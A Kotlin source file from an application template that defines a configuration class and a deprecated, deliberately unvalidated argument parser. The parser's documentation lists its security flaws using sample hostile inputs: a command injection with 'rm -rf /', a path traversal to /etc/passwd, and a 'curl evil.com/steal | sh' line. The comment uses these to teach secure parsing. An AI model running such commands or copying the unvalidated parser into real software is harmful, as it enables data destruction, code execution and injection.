////////////////////////////////////////////////////////////////////////////////
// Kotlin Hybrid Architecture Template
// Copyright (c) 2025 Michael Gardner, A Bit of Help, Inc.
// SPDX-License-Identifier: BSD-3-Clause
// See LICENSE file in the project root.
////////////////////////////////////////////////////////////////////////////////

package com.abitofhelp.hybrid.bootstrap

/**
 * Application configuration parsed from command-line arguments.
 *
 * ## Configuration Pattern
 * This data class represents the final, validated configuration.
 * It's the result of:
 * 1. Parsing command-line arguments
 * 2. Validating for security issues
 * 3. Applying defaults
 *
 * ## Why Data Class?
 * - Immutable by default (all vals)
 * - Automatic equals/hashCode/toString
 * - copy() for creating variations
 * - Destructuring support
 *
 * ## Default Values
 * Default parameters make the configuration flexible:
 * ```kotlin
 * // All of these are valid:
 * AppConfig()                                    // All defaults
 * AppConfig(verbose = true)                      // Just verbose
 * AppConfig(name = "Alice")                      // Just name
 * AppConfig(verbose = true, name = "Bob")        // Multiple values
 * ```
 *
 * ## Usage Example
 * ```kotlin
 * val config = parseArgs(arrayOf("--verbose", "Alice"))
 *
 * if (config.verbose) {
 *     println("Debug: Starting with config: $config")
 * }
 *
 * val outputPort = if (config.outputPath != null) {
 *     FileOutputAdapter(config.outputPath)
 * } else {
 *     ConsoleOutputAdapter()
 * }
 * ```
 *
 * @property verbose Enable detailed logging and debug information
 * @property outputPath Optional file path for output (null = console only)
 * @property name Optional name for personalization (null = anonymous)
 */
data class AppConfig(
    val verbose: Boolean = false,
    val outputPath: String? = null,
    val name: String? = null,
)

/**
 * Legacy argument parser without security validation.
 *
 * ## Security Issues with This Approach
 *
 * ### 1. No Input Validation
 * ```kotlin
 * args.firstOrNull { !it.startsWith("--") }
 * // Could be: "; rm -rf /" or "../../../../etc/passwd"
 * ```
 *
 * ### 2. No Length Limits
 * Could pass extremely long strings causing DoS.
 *
 * ### 3. No Path Sanitization
 * The output path isn't validated - could write anywhere!
 *
 * ### 4. Vulnerable to Injection
 * ```bash
 * # This would be accepted:
 * app "Alice; curl evil.com/steal | sh"
 * ```
 *
 * ## Why Keep This?
 * - Shows the security improvements in new parser
 * - Allows gradual migration
 * - Educational value
 *
 * ## The ReplaceWith Annotation
 * IDEs will offer to automatically replace calls to this
 * with the secure version. One click to upgrade!
 *
 * @deprecated Use SecureArgParser for secure argument parsing
 * @param args Raw command-line arguments (UNSAFE!)
 * @return Configuration (potentially with malicious values!)
 */
@Deprecated(
    "Use SecureArgParser for secure argument parsing",
    ReplaceWith("SecureArgParser.parseSecure(args)", "com.abitofhelp.hybrid.bootstrap.SecureArgParser"),
)
fun parseArgsLegacy(args: Array<String>): AppConfig {
    // Simple parsing - INSECURE!
    val verbose = args.contains("--verbose") || args.contains("-v")

    // Gets value after --out flag
    val out = args.indexOf("--out").takeIf { it >= 0 }?.let { idx ->
        args.getOrNull(idx + 1) // No validation!
    }

    // First non-flag argument is name
    val name = args.firstOrNull {
        !it.startsWith("--") && !it.startsWith("-")
    } // No sanitization!

    return AppConfig(verbose = verbose, outputPath = out, name = name)
}
